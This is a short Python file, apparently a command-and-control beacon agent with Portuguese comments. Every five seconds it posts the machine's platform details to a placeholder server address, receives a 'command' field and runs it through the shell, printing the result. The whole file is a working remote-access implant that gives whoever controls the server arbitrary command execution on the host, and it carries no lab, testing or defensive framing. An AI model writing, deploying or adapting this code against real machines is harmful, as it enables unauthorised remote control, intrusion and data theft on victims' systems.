# agent.py
import time
import requests
import subprocess
import platform

SERVER_URL = 'http://SEU_IP_LOCAL:5000/beacon'
AGENT_ID = 'agente001'

def get_status():
    # Status básico do sistema
    return platform.platform()

while True:
    try:
        data = {
            "agent_id": AGENT_ID,
            "status": get_status()
        }
        response = requests.post(SERVER_URL, json=data)
        command = response.json().get("command")
        
        if command:
            print(f"[+] Comando recebido: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            print(f"[+] Resultado:\n{result.stdout}")
        
        time.sleep(5)  # Delay entre beacons
    except Exception as e:
        print(f"Erro: {e}")
        time.sleep(10)
